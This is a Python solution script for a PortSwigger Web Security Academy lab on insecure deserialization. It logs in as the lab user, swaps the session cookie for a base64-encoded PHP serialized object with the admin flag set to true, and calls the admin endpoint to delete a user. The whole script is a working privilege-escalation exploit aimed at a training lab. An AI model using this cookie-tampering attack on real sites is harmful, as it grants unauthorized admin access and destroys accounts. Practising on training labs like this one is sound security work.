'''
This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0a1800f504126e6383357a3500d90006' # change based on generated lab
cookie_value = 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=' # base64 encoded payload for admin access. Decodes to: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}


def main():
    # first login as weiner:peter as instructed
    s = requests.session()
    uri = f"https://{lab_id}.web-security-academy.net/login"
    
    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter"
    }
    r1 = s.post(uri, data=data)

    # check the cookie for the serialized object and change the value to our payload above
    for cookie in s.cookies:
        if cookie.name == 'session':
            cookie.value = cookie_value 
            break

    # delete carlos and finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
    r2 = s.get(uri)
    print('done')


if __name__ == '__main__':
    main()